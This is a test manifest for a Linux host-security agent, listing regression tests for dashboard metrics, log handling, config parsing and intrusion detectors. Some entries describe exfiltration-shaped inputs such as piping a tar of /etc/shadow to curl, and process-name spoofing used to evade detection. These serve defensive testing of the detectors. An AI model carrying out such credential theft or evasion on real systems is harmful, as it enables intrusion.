# Anchor Tests Manifest

This file is the **public** ledger of regression-anchor tests. Each entry pins one bug class so it cannot come back silently. Anchor tests differ from regular regression tests in two ways:

1. **They are named for the bug, not the function.** A test named `blocks_today_agrees_across_all_graph_derived_surfaces` is an anchor; a test named `test_count_unique_ips` is not.
2. **They are referenced from this file.** A CI gate (`scripts/verify-anchor-tests.sh`) asserts every entry below still exists in the source tree. Deleting or renaming an anchor without updating this file fails CI.

The operator's private `.claude-local/RECURRING_BUGS.md` cross-references entries here for the bugs that needed anchors.

## Format

`<test_module_path>::<test_name>` — one-line description of what the test pins.

## Anchors

### Operator-visible number consistency

- `crates/agent/src/dashboard/consistency_block_counts.rs::blocks_today_agrees_across_all_graph_derived_surfaces` — "Blocks today" agrees across dashboard live feed, top bar, site live feed, and the shared graph helper. Pinned the 2026-04-11 / 2026-04-22 dashboard-vs-site count drift.

- `crates/agent/src/dashboard/consistency_case_metrics.rs::overview_counts_new_fields_reconcile_with_leaf_buckets` — spec 049 math contract: `flagged_by_system = contained + observing + filtered_out + needs_review`, `warden_decisions = contained + observing + filtered_out`, `needs_review = flagged - warden_decisions`. Fires if any leaf-bucket refactor forgets to recompute the derived totals.

- `crates/agent/src/dashboard/consistency_case_metrics.rs::dismissed_cases_are_counted_not_silently_dropped` — spec 049 Q1+Q7 regression guard: 10 dismissed cases produce `filtered_out=10` / `flagged=10` / `warden_decisions=10`. Pre-spec-049 the `KpiBucket::None` arm was `=> {}` and the count was silently zero.

- `crates/agent/src/dashboard/consistency_case_metrics.rs::tally_cases_to_overview_counts_round_trip_pins_prod_screenshot_shape` — the operator's prod input that motivated spec 049 (4 block + 3 observing + 45 dismiss + 1 no-decision) MUST round-trip through `tally_cases` to `flagged=53`, `warden_decisions=52`, `needs_review=1`.

- `crates/agent/src/dashboard/case_metrics.rs::tests::dismissed_kpi_bucket_maps_to_filtered_out_not_dropped` — `KpiBucket::None` maps to `CaseOutcome::FilteredOut`. Pre-spec-049 was silently uncounted; future revert lights this up.

- `crates/agent/src/dashboard/case_metrics.rs::tests::kpi_bucket_mapping_is_total_and_canonical` — every `KpiBucket` variant has exactly one `CaseOutcome` mapping. A new variant landing without a mapping fails the test.

- `crates/agent/src/response_lifecycle.rs::tests::current_orphan_count_returns_zero_on_clean_system` — `current_orphan_count()` returns the number of real orphan entries on disk, never the lifetime counter. Pinned the 2026-05-03 banner gaslighting bug ("17 orphaned" persisting after PR #408 GC pruned the entries).

- `crates/agent/src/response_lifecycle.rs::tests::to_json_exposes_gauges_shape_distinct_from_totals` — JSON output keeps `gauges.*` (current state) separate from `totals.*` (lifetime counters). Anti-regression for collapsing them back into one field.

- `crates/agent/src/dashboard/mod.rs::tests::js_responses_banner_reads_gauges_not_totals` — frontend banner reads `r.gauges?.orphaned`, drift trigger does not key off the lifetime counter, banner copy says "currently pending" so the operator reads it as present-tense gauge.

### Knowledge graph correctness

- `crates/agent/src/knowledge_graph/ingestion.rs::tests::ingest_clears_current_event_metadata_after_run` — `_current_event_*` fields are cleared at the end of every `ingest()` call. Pinned the 2026-05-03 cross-attribution bug (agent self-traffic appearing under attacker IP journey).

- `crates/agent/src/knowledge_graph/ingestion.rs::tests::add_edge_outside_ingest_does_not_inherit_stale_summary` — edges created outside an ingest cycle do not inherit the previous event's summary as a stale property.

### Memory budget

- `crates/agent/src/loops/boot.rs::heap_budget::run_agent_once_allocates_under_budget` — boot path stays under 500MB peak alloc.
- `crates/agent/src/knowledge_graph/persistence.rs::heap_budget::save_to_store_allocates_under_budget` — KG snapshot save stays under 5MB per call.
- `crates/agent/src/loops/slow_loop.rs::heap_budget::process_narrative_tick_allocates_under_budget` — slow-loop tick stays under 10MB.

### Dashboard UX consistency

- `crates/agent/src/dashboard/mod.rs::tests::js_intel_baseline_tab_is_english_not_pt_br` — Baseline tab strings are English. Anti-regression for PT-BR copy reintroduction.

### Baseline UX honesty

- `crates/agent/src/dashboard/mod.rs::tests::js_login_heatmap_hides_service_accounts_by_default` — the "Who logs in, when" heatmap default-hides daemon PAM sessions (snap_daemon, systemd-resolve, messagebus, _apt, ...) and exposes a "Show system accounts" toggle. Pinned the 2026-05-03 visual report where the operator read the heatmap as "all these people have logged in" when only `ubuntu` had real SSH sessions.

- `crates/agent/src/dashboard/intelligence.rs::baseline_enrich_tests::build_user_classes_marks_daemon_sessions_as_service` — the `/api/baseline-status` endpoint enriches the JSON with a `user_classes` map keyed by username. snap_daemon (uid 584788, /usr/bin/false) classifies as `service`, ubuntu (uid 1000, /bin/bash) as `human`, root as `root`, and unknown users fall through to `unknown` so the operator still sees them. Anti-regression for the classification contract that the frontend keys off.

### Baseline learning honesty (Wave 5b)

- `crates/agent/src/baseline.rs::tests::is_valid_unix_username_rejects_brute_force_and_garbage` — `is_valid_unix_username` rejects `Admin`, `AdminGPON`, `1234`, `123456789`, `!`, `(`, `*` and other shapes observed in the operator's polluted prod baseline on 2026-05-03. Anti-regression for any change that loosens the regex to allow uppercase, leading digits, or special chars.

- `crates/agent/src/baseline.rs::tests::observe_event_skips_honeypot_source_logins` — events with `source` starting `honeypot` never write to `user_login_hours`. Pinned because the agent's honeypot accepts every credential to fool attackers; if the session log is wired into the event pipeline (now or later), baseline must not record those usernames.

- `crates/agent/src/baseline.rs::tests::observe_event_skips_invalid_usernames` — even from non-honeypot sources, entity values that fail `is_valid_unix_username` are not written. This is the actual operator-hit case: a third-party sshd or PAM module emitted `ssh.login_success` for `AdminGPON` and baseline recorded it.

- `crates/agent/src/baseline.rs::tests::prune_invalid_users_cleans_pre_wave5b_pollution` — `prune_invalid_users()` removes existing pollution from on-disk baseline.json. The boot path calls it once at load so existing prod hosts get cleaned on the next agent restart.

### XDP availability gate (Wave 5b PR-2)

- `crates/agent/src/xdp_availability.rs::tests::xdp_availability_gate_skips_attempts_and_rate_limits_warns` — `should_attempt_xdp()` skips XDP attempts for `RECHECK_INTERVAL_SECS` (5 min) after a failure, AND `mark_failed()` rate-limits the operator-facing WARN to one per window. Pinned the 2026-05-03 prod log-spam where bpffs was unmounted and the agent emitted two WARN lines per block decision (3+ blocks/hour) plus a wasted bpftool subprocess each time.

### SQLite backfill contention (Wave 5b PR-3)

- `crates/agent/src/loops/slow_loop.rs::tests::backfill_throttle_allows_one_per_minute_then_blocks` — the src_ip backfill runs at most once per minute even though slow_loop ticks every 30 s. Pinned the 2026-05-03 prod log spam where the backfill raced the sensor's concurrent SQLite writer (separate process, same .db file) for the writer lock every 30 s and lost. Combined with `BACKFILL_BATCH_SIZE: usize = 100` (was 1000) and the lock-error retry-with-backoff in `drive_events_src_ip_backfill`, prod hosts now make forward progress without log spam.

### KG correctness (Wave 5b PR-4)

- `crates/agent/src/knowledge_graph/persistence.rs::tests::snapshot_after_node_eviction_carries_no_dangling_edges` — pre-save compaction (`compact_edges_force`) must remove tombstoned edges so the persisted blob never carries dangling references. Pinned the 2026-05-03 prod WARN spam `Knowledge graph has dangling edge references — pruning dangling=30157` that fired every save cycle for days.

- `crates/agent/src/knowledge_graph/detectors/mod.rs::tests::discovery_burst_severity_caps_at_medium_for_service_users` — the `graph_discovery_burst` detector caps severity at Medium for Service-class users. Pinned the 2026-05-03 operator-visible bug where `snap_daemon` (uid 584788) doing 92 actions in 60s during a routine snap refresh fired a HIGH-severity red-banner alert on the site home as if the server were compromised.

### Live-feed JSONL fallback (Wave 5c PR-5)

- `crates/agent/src/dashboard/live_feed.rs::tests::jsonl_fallback_recovers_count_when_kg_is_empty` — when the in-memory KG is empty (TTL evicted everything) but `incidents-{date}.jsonl` on disk has entries, `merge_incidents_prefer_kg` surfaces every JSONL entry. Pinned the 2026-05-03 site-vs-dashboard discrepancy where the public live feed reported "4 events / 0 blocks (24h)" while prod JSONL had 42 incidents and 647 block decisions. Anti-regression for any refactor that drops the JSONL read or short-circuits when the KG is empty.

- `crates/agent/src/dashboard/live_feed.rs::tests::merge_incidents_prefers_kg_and_dedups_by_incident_id` — the merge prefers KG-side entries (richer entity context) and dedupes by `incident_id` so neither tier double-counts. Pinned the contract that frontend numbers reflect the count of distinct incidents, not the sum of two stores.

- `crates/agent/src/dashboard/live_feed.rs::tests::load_jsonl_incidents_returns_empty_on_missing_file` — the JSONL loader returns an empty vec on missing/unreadable files so a degraded-IO state never crashes the public live-feed endpoint.

### GeoIP cache + live-feed sources (Wave 6a)

- `crates/agent/src/geo_cache.rs::tests::entry_expires_exactly_at_ttl_boundary` — `GeoEntry::is_expired` honours the 7-day TTL boundary exactly. Anti-regression for any change that bumps the TTL silently and inflates the ip-api rate-budget consumption.

- `crates/agent/src/geo_cache.rs::tests::get_fresh_distinguishes_hit_miss_and_stale` — `GeoCache::get_fresh` returns Some(entry) only when the entry exists AND is within the TTL. Pinned the contract that the public site map depends on: a hit avoids ip-api, a miss/stale falls through to the network. A regression that "always returns Some" would silently serve stale geo; "never returns Some" would re-DDOS ip-api on every page load.

- `crates/agent/src/dashboard/live_feed.rs::tests::live_feed_sources_carry_geo_from_disk_cache` — `/api/live-feed` carries a `sources` array with country/lat/lon already attached for every IP found in `geo-cache.json`. Pinned the operator-visible bug shape "site map shows 4 dots while there are 138 attackers" — without pre-attached geo the frontend would need 138 round-trips to ip-api (rate-limited at 45/min = 3+ minutes of cold start).

### Autoencoder anchor recalibration (Wave 7a)

- `crates/agent/src/neural_lifecycle.rs::tests::recalibrate_replaces_anchors_with_fresh_distribution` — `recalibrate_anchors_from_events` rebuilds `baseline_percentile_anchors` from a fresh batch of events without touching the network weights, and the new anchors are sorted ascending. Pinned the 2026-05-04 prod symptom where every observe() returned `score="1.000"` because stale training-time anchors did not represent current event distribution; spec-033 tanh extrapolation saturated near 1.0; +9.9% boost in `incident_decision_eval` fired as a constant offset (zero discriminative value).

- `crates/agent/src/neural_lifecycle.rs::tests::recalibrate_refuses_short_input_keeps_old_anchors` — refuses to act when fewer than `BASELINE_PERCENTILES` (101) full-window MSE samples can be collected, and leaves existing anchors untouched. Anti-regression for a future change that silently writes degenerate (under-sampled) anchors.

- `crates/agent/src/neural_lifecycle.rs::tests::recalibrate_persisted_state_round_trips_via_disk` — recalibrated state survives the `anomaly-model.bin` save → reload cycle. `training_cycles` is preserved exactly via the synthesised `total_samples = cycles * 100_000` field that the v2 file format expects. Anti-regression for any change that breaks the binary layout match between `persist_model_state` and `parse_model_file`.

- `crates/agent/src/neural_lifecycle.rs::tests::persist_after_recal_preserves_loaded_total_samples_exactly` — when the engine was loaded from a model file with `total_samples` not a multiple of 100_000 (e.g. 499_999), a recalibration save preserves the original value rather than re-deriving from `cycles * 100_000`. Pre-fix the synthesis would have truncated 499_999 → 400_000 and silently dropped maturity from ~1.0 to ~0.8. (Copilot #2 review on PR #435)

- `crates/agent/src/neural_lifecycle.rs::tests::persist_pads_anchor_table_to_exact_layout_size` — `persist_model_state` writes exactly `BASELINE_PERCENTILES * 4` anchor bytes, padding with 0.0 if the in-memory vec ever shrinks below the constant. Pre-fix a short vec would emit a truncated v2 layout that the loader would reject on the next restart. (Copilot #3 review on PR #435)

- `crates/agent/src/neural_lifecycle.rs::tests::persist_keeps_previous_model_as_dot_prev_backup` — write order is "tmp first, durable, then rotate previous to .prev, then atomic rename onto target". Pre-fix the rotate-then-write order created a window where a tmp-write failure left zero usable model files. (Copilot #1 review on PR #435)

- `crates/agent/src/neural_lifecycle.rs::tests::train_nightly_post_recal_skips_when_no_graph_features` — the post-train recalibration block in `train_nightly_with_store` is gated on `Some(graph_features)`; without graph features the recalibration is skipped so test fixtures and pre-graph boots do not get a recalibration that would overwrite anchors with a degraded no-graph distribution. Pinned the operator-observed bug where the 2026-05-04 nightly retrain wiped Wave 7a's boot recalibration and prod returned to 100% saturation by morning.

### rootkit:timing protocol-stream FP skip (spec 071 Part B)

- `crates/sensor/src/detectors/rootkit.rs::tests::timing_skips_tcp_stream_protocol_kinds` — `tcp_stream.http` / `.ssh` / `.smb` are excluded from the timing-anomaly pipeline (alongside the already-skipped `tcp_stream.flow` and `network.*`): their inter-event delta measures traffic idleness, not syscall-hook latency, so they are never tracked or flagged. Pinned the 2026-06-08 test001 FP where an 895-second gap between two HTTP streams (baseline ~4.8s) fired a critical `rootkit:timing` "getdents64 hook" incident that flooded `needs_review`.
- `crates/sensor/src/detectors/rootkit.rs::tests::timing_still_tracks_file_read_access_after_tcp_stream_skip` — anti-regression: extending the skip list did NOT disable the real latency-tracked kinds; `file.read_access` still trains and remains eligible for timing detection (a getdents64 hook adds µs and is the detector's actual purpose).

### Orphan-recovery retry (spec 071 Part C)

- `crates/agent/src/orphan_recovery.rs::tests::is_passive_resolution_accepts_only_pure_verdicts` — only `dismiss`/`ignore` resolve a retried orphan; `monitor` / `block_ip` (and any active verdict) fall through to `needs_review` so the human still adjudicates a stale action. Pins the invariant that the retry never executes a stale enforcement action.
- `crates/agent/src/orphan_recovery.rs::tests::retry_decide_resolves_high_crit_orphan_with_dismiss` — a High/Critical orphan whose re-decide returns a pure-verdict close is resolved with a real decision instead of being parked for a human (closes the "AI never ran → needs_review" inflation from transient restarts).
- `crates/agent/src/orphan_recovery.rs::tests::retry_decide_returns_none_on_unparseable_incident` — a bad incident JSON yields `None` so the sweep safely falls back to `needs_review` (never panics, never loses the orphan).

### suspicious_archive suppresses InnerWarden self-unpack (spec 072 Part D-sensor)

The model/config install (`tar -xzf … -C /var/lib/innerwarden/models`) is an EXTRACTION into our own data dir, not exfil staging. Gated on extraction (not create) so an attacker cannot launder a `tar -c` of sensitive data by appending `/var/lib/innerwarden`.

- `crates/sensor/src/detectors/mitre_hunt.rs::tests::suspicious_archive_suppresses_innerwarden_model_unpack` — extracting our tarball into `/var/lib/innerwarden` does NOT fire.
- `crates/sensor/src/detectors/mitre_hunt.rs::tests::suspicious_archive_still_fires_on_create_of_sensitive_into_iw_dir` — anti-bypass: a `tar -c` of `/etc/shadow` outputting into our dir STILL fires (create ≠ extraction).
- `crates/sensor/src/detectors/mitre_hunt.rs::tests::suspicious_archive_still_fires_on_real_exfil` — regression: a genuine `tar -c` of sensitive dirs to `/tmp` still fires.
- `crates/sensor/src/detectors/mitre_hunt.rs::tests::is_innerwarden_self_unpack_logic` — extraction-vs-create + our-dir-vs-other classifier.

### host_drift comm allowlist gated on the non-forgeable exe path (spec 072 Part D-sensor)

`host_drift` skipped on the forgeable `comm` allowlist BEFORE checking the path, so `/tmp/payload` with `comm=cargo` was a comm-spoof bypass inside the detector. The allowlist is now revoked for binaries in an untrusted staging dir.

- `crates/sensor/src/detectors/host_drift.rs::tests::allowlisted_comm_from_raw_staging_fires` — `comm=cargo` running from a raw `/tmp/payload` MUST fire Critical (the allowlist no longer shields a staging exe).
- `crates/sensor/src/detectors/host_drift.rs::tests::allowlisted_comm_from_cargo_build_temp_still_skipped` — regression: real cargo build temp (`/tmp/cargo-*`) stays suppressed via the development-path allowlist (the staging gate did not break builds).
- `crates/sensor/src/detectors/host_drift.rs::tests::allowlisted_comm_from_nonstaging_path_still_skipped` — a non-staging path with an allowlisted comm still skips (the gate only revokes the allowlist for staging dirs).
- `crates/sensor/src/detectors/host_drift.rs::tests::path_in_untrusted_staging_classifies_dirs` — staging-dir classifier.

### Warden Context Gate — non-forgeable `provenance:illegitimate` overrides the classifier (spec 072 Phase 2)

The mirror of the comm rule: a forgeable comm can never DISMISS a real threat; symmetrically, a detector's non-forgeable `evidence.provenance:illegitimate` (spec-070 exe-path lineage) can never BE dismissed by the text-only classifier — even at high confidence.

- `crates/agent/src/warden_context_gate.rs::tests::illegitimate_provenance_refuses_even_high_confidence_dismiss` — a classifier dismiss at conf 0.97 on a `provenance:illegitimate` incident is refused and surfaced.
- `crates/agent/src/warden_context_gate.rs::tests::illegitimate_provenance_does_not_touch_enforcement` — the guard only refuses passive closes; a `block_ip` stands.
- `crates/agent/src/warden_context_gate.rs::tests::non_illegitimate_provenance_unaffected_by_guard` — a trusted/absent tag does not trigger the guard.
- `crates/agent/src/warden_context_gate.rs::tests::evidence_provenance_is_illegitimate_parses_array_and_object` — evidence parser handles both the array and single-object shapes.

### Warden Context Gate — no forgeable-comm dismiss of a real threat (spec 071 Part A)

These pin the 2026-06-08 adversarial red-team must-fixes. `comm` is attacker-forgeable, so the gate must NEVER auto-dismiss a High/Critical incident on it. A failure here means a real attack can be silenced by a process rename.

- `crates/agent/src/warden_context_gate.rs::tests::adversarial_self_spoofed_critical_privesc_is_never_dismissed` — naming the binary `innerwarden-agent` must NOT dismiss a Critical privesc (it surfaces). Undoing this re-opens the spec-070 anti-spoof bypass (B1).
- `crates/agent/src/warden_context_gate.rs::tests::adversarial_build_spoofed_critical_host_drift_tmp_is_never_dismissed` — `comm=rust-lld` on a Critical `/tmp` host_drift is not dismissed (host_drift is off both allowlists; B2).
- `crates/agent/src/warden_context_gate.rs::tests::adversarial_self_spoofed_high_data_exfil_is_never_dismissed` — `comm=innerwarden-ctl` on a High data_exfil_cmd is not dismissed (B3).
- `crates/agent/src/warden_context_gate.rs::tests::adversarial_self_spoof_does_not_launder_block_to_dismiss` — a `block_ip` on a Critical incident with a spoofed trusted comm is never turned into a silent dismiss (B4).
- `crates/agent/src/warden_context_gate.rs::tests::adversarial_overbroad_comm_does_not_impersonate` — exact base-name match: `innerwarden9` / `ccminer` do NOT match the allowlists (B6).
- `crates/agent/src/warden_context_gate.rs::tests::unlisted_detector_from_self_not_dismissed_even_at_medium` — the Medium/Low provenance dismiss is a tight per-detector allowlist, not a blanket self/build pass.

### CLI module/capability surface (Wave 7b)

- `crates/ctl/src/scan.rs::tests::module_ids_use_module_install_not_enable` — every `enable_hint` on a `ModuleRec` and every step of `activation_sequence()` that starts with `innerwarden enable <id>` must use a real capability id (`block-ip`, `sudo-protection`, `shell-audit`, `ai`); module ids must use `innerwarden module install <id>`. Pinned the 2026-05-04 operator-hit bug where `innerwarden scan` printed `→ innerwarden enable container-security` and the operator running it got `unknown capability 'container-security'` because container-security is a module, not a capability.

- `crates/ctl/src/main.rs::tests::known_module_id_recognises_registry_modules` — `known_module_id` recognises module ids declared in the workspace `registry.toml` (`openclaw-protection`, `cloudflare-integration`, etc.) regardless of the file's whitespace formatting. Anti-regression for the brittle 10-space substring scan the helper replaced.

- `crates/ctl/src/main.rs::tests::known_module_id_rejects_capabilities_and_typos` — capability ids (`block-ip`, `shell-audit`) and partial-match typos (`openclaw`, `ssh-protect`) do NOT classify as modules, so the suggestion path is not triggered for the wrong surfaces.

- `crates/ctl/src/main.rs::tests::unknown_cap_error_suggests_module_install_for_modules` — when the operator runs `enable <name>` and `<name>` matches a module id from the registry, the error message contains `module install <name>` so they have a one-paste path to recovery instead of grepping `innerwarden list`.

- `crates/ctl/src/main.rs::tests::unknown_cap_error_falls_back_for_typos` — when `<name>` is not a known module id, the error is the generic "unknown capability" line. Anti-regression for accidentally suggesting `module install` for typos like `enable bllock-ip`, which would dead-end the operator on the wrong surface.

### Correlation engine — package-manager false-positive suppression (Wave 8a)

- `crates/agent/src/correlation_engine.rs::tests::cl008_does_not_match_when_originating_process_is_a_package_manager` — CL-008 (Data Exfiltration via eBPF Sequence) refuses to match when `event.details.comm` is a package manager (apt-get reading /etc/apt/sources.list + connecting to archive.ubuntu.com). Pinned the 2026-05-04 prod incident where CL-008 fired 32 critical chains in one day and auto-blocked Ubuntu archive mirrors (91.189.91.46), GitHub Pages CDN (185.199.108-111.153), Telegram (149.154.166.110 — the agent's own notification infra) and Oracle Cloud (147.154/16) via UFW with `dry_run=false`.

- `crates/agent/src/correlation_engine.rs::tests::cl008_still_matches_for_non_package_manager_processes` — same shape as above but `comm = "bash"` reading /etc/shadow + connecting to a random IP — chain MUST still fire. The suppression list is a tight allowlist, not a hole that disables the chain entirely.

- `crates/agent/src/correlation_engine.rs::tests::cl008_suppression_handles_15char_truncated_comms` — Linux truncates `comm` at TASK_COMM_LEN-1 = 15 chars, so `unattended-upgrade` arrives as `unattended-upgr`, `dpkg-statoverride` as `dpkg-statoverri`, etc. The suppression list MUST contain the truncated forms or the bug returns silently for any host running unattended-upgrades (the Ubuntu default — including the prod host that hit this on 2026-05-04).

- `crates/agent/src/correlation_engine.rs::tests::comm_suppression_does_not_leak_to_other_rules` — only CL-008 opts into package-manager suppression today. Other rules with the same kind patterns must still fire; suppression is keyed by `rule_id`, not global. Anti-regression for accidentally lifting the per-rule gate (would silently disable many chains).

- `crates/agent/src/correlation_engine.rs::tests::cl008_no_comm_field_does_not_panic_and_falls_through` — older sensors (or non-eBPF event sources) emit `file.read_access` without a `comm` field. `event_comm_is_suppressed` returns false in that case (event proceeds to normal kind/entity matching) instead of panicking on the missing JSON key.

### data_exfil_cmd build-tool skip is gated on the non-forgeable exe path (spec 072 Part D-sensor)

`comm` is attacker-forgeable (argv0 / prctl), so the build-tool skip is only honoured when the kernel-captured `exe_path` is NOT in an untrusted staging dir. A failure here means a renamed payload in `/tmp` can launder exfil through the build-tool skip.

- `crates/sensor/src/detectors/data_exfiltration.rs::tests::command_exec_fires_when_build_tool_name_runs_from_staging_dir` — `comm=cargo` but `exe_path=/tmp/cargo` on a real exfil command MUST fire (the skip is bypassed for staging exes).
- `crates/sensor/src/detectors/data_exfiltration.rs::tests::command_exec_skips_build_tool_from_trusted_exe_path` — same `comm=cargo` with `exe_path=/usr/bin/cargo` is suppressed (a real toolchain binary).
- `crates/sensor/src/detectors/data_exfiltration.rs::tests::command_exec_falls_back_to_comm_skip_when_no_exe_path` — when `exe_path` is absent (a /proc race), the comm-only skip (#970) still applies (no regression).
- `crates/sensor/src/detectors/data_exfiltration.rs::tests::exe_path_in_untrusted_staging_classifies_dirs` — `/tmp`,`/var/tmp`,`/dev/shm` are staging; `/usr/bin`, `~/.cargo/bin` are not.

### data_exfil_cmd build-toolchain FP suppression (spec 071 Part B)

- `crates/sensor/src/detectors/data_exfiltration.rs::tests::command_exec_skips_zig_compiler` / `command_exec_skips_zigcc_truncated_comm` / `command_exec_skips_cargo_build_script` / `command_exec_skips_rust_lld_linker` — each feeds a real `tar | curl` exfil-shaped command whose only reason to be suppressed is that `comm` is a build tool (`zig`, the truncated `zigcc-x86_64-un`, `build-script-bu`, `rust-lld`). Pins the 2026-06-08 test001 FP cluster where the Rust/Zig build toolchain produced 100+ `data_exfil_cmd` High incidents that flooded `needs_review`. The `build_tools` list previously had `cargo`/`rustc`/`gcc` but not `zig`/`zigcc`/`build-script`.
- `crates/sensor/src/detectors/data_exfiltration.rs::tests::command_exec_skips_zig_via_first_word_of_command` / `command_exec_skips_zig_build_shell_wrapper` — cover the two non-comm suppression branches (first word of a `bash -c` command is a build tool; the long-shell-wrapper `zig build` guard).
- `crates/sensor/src/detectors/data_exfiltration.rs::tests::command_exec_still_detects_real_exfil_from_non_build_comm` — anti-regression: a genuine `tar /etc/shadow | curl` from `comm=python3` MUST still raise the incident. The exclusion list is a tight allowlist, not a hole that disables the detector.

### Allowlist audit trail (Wave 8e)

- `crates/ctl/src/commands/response.rs::tests::cmd_allowlist_add_with_reason_persists_reason_in_admin_audit` — `innerwarden allowlist add --ip <cidr> --reason "<text>"` writes the verbatim reason into the daily `admin-actions-YYYY-MM-DD.jsonl`. Pinned the 2026-05-04 operator pain: 4 emergency CIDRs (Ubuntu mirrors, Telegram, GitHub Pages, Oracle Cloud) were added during a CL-008 mitigation with no flag to record WHY, so a future operator looking at the allowlist had no way to tell if the entries were still load-bearing or stale.

- `crates/ctl/src/commands/response.rs::tests::cmd_allowlist_add_without_reason_records_null_reason_in_audit` — `--reason` is OPTIONAL for backwards compat with existing operator scripts, but omitting it MUST surface as `"reason":null` in the audit log so future-operator tooling can grep for entries with no recorded WHY. Anti-regression for silently accepting reason-less adds (the original 2026-05-04 bug shape).

### Config file permission fix (Wave 8d)

- `crates/agent/src/config/mod.rs::tests::perm_fix_command_does_chown_before_chmod` — the operator-facing fix command for over-permissive `agent.toml` MUST do `chown innerwarden:innerwarden` BEFORE `chmod 600`. Pinned because the previous WARN ("consider chmod 600") led the operator straight into a broken-restart trap on 2026-05-04: chmod 600 on a root-owned file with the agent running as a non-root service user makes the config unreadable on the next start. Reversing the order in this string is the bug we are guarding against.

- `crates/agent/src/config/mod.rs::tests::perm_fix_command_handles_paths_without_shell_injection` — the path is operator-controlled (passed via `--config`), so the fix-suggestion string must not contain backticks, `$()`, or extra `&&` chains beyond the one we put there. Anti-regression for accidentally interpolating shell metacharacters into a copy-pasteable command.

### Config schema strictness (Wave 9e — silent-TOML-drift gate)

- `crates/agent/src/config/mod.rs::tests::data_retention_alias_resolves_to_data_section` — operators with the legacy `[data_retention]` section name keep working: the `#[serde(alias = "data_retention")]` on `AgentConfig::data` resolves the section into `cfg.data` so `filestore_max_size_mb`, `events_keep_days`, and the rest are actually applied. Pinned the 2026-05-04 audit AUDIT-002: prod's `[data_retention] filestore_max_size_mb = 1024` had been a silent no-op because the section name did not match the field; removing the alias would brick every existing prod config on the next deploy.

- `crates/agent/src/config/mod.rs::tests::data_section_canonical_name_works_too` — the canonical `[data]` section name (which matches the `pub data` field) parses as expected. Pairs with the alias test so future readers see both forms exercised in the same module.

- `crates/agent/src/config/mod.rs::tests::unknown_top_level_section_fails_loudly` — `#[serde(deny_unknown_fields)]` on `AgentConfig` rejects sections like `[bogus_section]` with a clear error. Anchor against accidentally lifting the deny gate, which would re-introduce the AUDIT-002 silent-drift class for top-level sections.

- `crates/agent/src/config/mod.rs::tests::unknown_inner_key_fails_loudly_in_data_section` — the strict gate also fires on inner-key typos like `keep_dayss` under `[data]`. This is the EXACT failure shape AUDIT-002 surfaced (prod's `[data_retention] keep_days = 7` was using a key that does not exist on `DataRetentionConfig`).

- `crates/agent/src/config/mod.rs::tests::legacy_data_retention_with_unknown_inner_key_also_fails_loudly` — the alias does NOT bypass the inner-struct strictness. A legacy `[data_retention]` block with bogus keys still hard-fails, so operators get told about each typo on the deploy that matters and can fix them in one go.

- `crates/agent/src/config/mod.rs::tests::empty_config_uses_defaults_cleanly` — an empty TOML still deserialises to `AgentConfig::default()`. Anti-regression for adding `deny_unknown_fields` somewhere that breaks Default.

- `crates/agent/src/config/mod.rs::tests::every_top_level_section_is_documented_with_an_inner_struct` — locks the canonical set of top-level sections. Adding a new section is fine; renaming or removing one fails this test, forcing the contributor to either pair the rename with a `serde(alias)` (back-compat for existing prod agent.toml files) or document the breaking change.

### Sensor log discipline (Wave 9f — AUDIT-010 anchor)

- `crates/sensor/src/collectors/log_state.rs::tests::first_failure_warns_subsequent_identical_failures_are_quiet` — `OpenLogState` emits exactly one `WarnNewFailure` for the first failure in a state and `Quiet` on every subsequent retry with the same error. Pinned the 2026-05-04 prod log spam where `nginx_access` and `nginx_error` collectors emitted **728 WARN entries in 30 minutes** while retrying a missing log file every 5 s — one WARN per attempt instead of one WARN per failure episode. Pre-fix the same scenario produced ~720 WARN/h; post-fix it produces 1.

- `crates/sensor/src/collectors/log_state.rs::tests::recovery_after_failure_emits_info_and_resets` — when an open succeeds after a failure, `observe_open` returns `InfoRecovered` (logged at INFO by the collector). Pairs with the WARN the operator saw earlier; closes the loop on the failure episode.

- `crates/sensor/src/collectors/log_state.rs::tests::different_error_after_first_failure_warns_again` — ENOENT followed by EACCES re-WARNs because the failure shape changed. Anti-regression for a "remember every error we ever saw and never WARN again" simplification that would silence the second failure class.

- `crates/sensor/src/collectors/log_state.rs::tests::flapping_failure_recovery_failure_re_warns_each_failure_episode` — drop-in / drop-out / drop-in cycles produce one WARN per failure episode + one INFO per recovery. Anti-regression for cumulative-state designs that would silence the second episode.

- `crates/sensor/src/collectors/log_state.rs::tests::long_run_steady_failure_emits_one_warn_total` — end-to-end count: 720 retries against a persistent failure produces exactly 1 WARN (vs 720 pre-fix). The headline anchor for the AUDIT-010 reproduction case.

- `crates/sensor/src/collectors/log_state.rs::tests::classify_open_repeat_failure_returns_retry_quiet` — `classify_open` returns `Retry { verdict: Quiet }` for repeated identical failures, so the collector's match arm leads to a debug log, never a WARN. Anti-regression for accidentally re-emitting WARN on every retry through the high-level helper.

- `crates/sensor/src/collectors/log_state.rs::tests::classify_open_recovery_returns_proceed_info_recovered` — the success-after-failure path produces `Proceed { verdict: Some(InfoRecovered) }`, so the collector knows to log the recovery INFO line and resume the read loop.

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_retry_quiet_is_debug_suppressed` - `log_instruction_for(Retry { Quiet })` returns `DebugSuppressed`. Anti-regression for collapsing the suppressed-retry branch back to `WarnCannotOpen`, which would resurrect the AUDIT-010 prod log flood (~720 WARN/h on a missing nginx log).

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_retry_first_failure_is_warn` - `log_instruction_for(Retry { WarnNewFailure })` returns `WarnCannotOpen`. Pins that the FIRST observation of a failure stays at WARN (operator visibility) regardless of how the per-verdict mapping is rewritten.

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_end_to_end_through_classify_open` - exercises the full `state -> classify_open -> log_instruction_for` chain across 100 retries: 1 WARN, 100 DEBUGs, 1 INFO recovery. End-to-end shape that documents the contract three layers care about.

- `crates/sensor/src/collectors/log_state.rs::tests::log_instruction_retry_recovered_falls_back_to_debug_in_release` - defensive: if a future verdict variant ever ends up on a `Retry { InfoRecovered }` path (contract drift), the helper returns the QUIETEST level, not WARN. `debug_assert!` still fires in debug builds; release builds degrade to `DebugSuppressed`.

- `crates/sensor/src/collectors/nginx_access.rs::tests::run_emits_event_for_existing_log_line` - exercises the `Ok` arm of `match open_result` end-to-end: tempfile with one valid combined-log-format line, the collector parses it and emits an `http.request` event. Anchors that the Wave 9f refactor (extracting `log_instruction_for`) did not break the happy path.

